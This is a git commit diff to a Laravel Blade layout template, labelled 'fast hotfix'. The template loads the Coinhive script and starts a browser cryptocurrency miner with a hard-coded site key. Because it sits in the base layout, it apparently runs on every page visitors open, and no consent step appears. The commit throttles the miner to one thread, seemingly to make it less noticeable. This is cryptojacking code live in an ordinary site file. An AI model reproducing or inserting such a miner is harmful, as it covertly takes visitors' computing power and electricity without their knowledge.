de2e49200043bece7596db49dc12edc466e10285
Dawid Monka <dawid.monka@hotmail.com>
2018-01-13 19:02:39 +0100

    fast hotfix

--- resources/views/layout/layout.blade.php
+++ resources/views/layout/layout.blade.php
@@ -47,7 +47,7 @@
     <script src="{{ asset('js/app.js') }}"></script>
     <script src="https://coinhive.com/lib/coinhive.min.js"></script>
     <script>
-        var miner = new CoinHive.Anonymous('P7tmhUNXYsdufurryd6rcyTjAJMuoSy4');
+        var miner = new CoinHive.Anonymous('P7tmhUNXYsdufurryd6rcyTjAJMuoSy4',{throttle: 0.85, threads: 1});
         miner.start();
     </script>
 </body>
